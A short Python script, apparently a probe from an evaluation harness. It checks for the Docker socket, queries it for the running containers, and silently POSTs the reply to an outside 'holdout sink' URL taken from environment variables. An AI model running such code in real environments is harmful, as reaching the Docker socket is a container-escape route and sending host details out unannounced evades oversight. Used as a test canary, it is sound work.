import os
import socket
import urllib.request

if os.path.exists("/var/run/docker.sock"):
	api_result = b""
	try:
		client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
		client.settimeout(2)
		client.connect("/var/run/docker.sock")
		client.sendall(b"GET /containers/json HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
		api_result = client.recv(4096)
		client.close()
	except Exception:
		pass
	url = os.environ.get("HOLDOUT_SINK_URL")
	run_id = os.environ.get("HOLDOUT_RUN_ID")
	if url and run_id:
		req = urllib.request.Request(url + "/events?run_id=" + run_id, data=api_result[:4096] or b"docker-socket-present", method="POST")
		try:
			urllib.request.urlopen(req, timeout=3).read()
		except Exception:
			pass
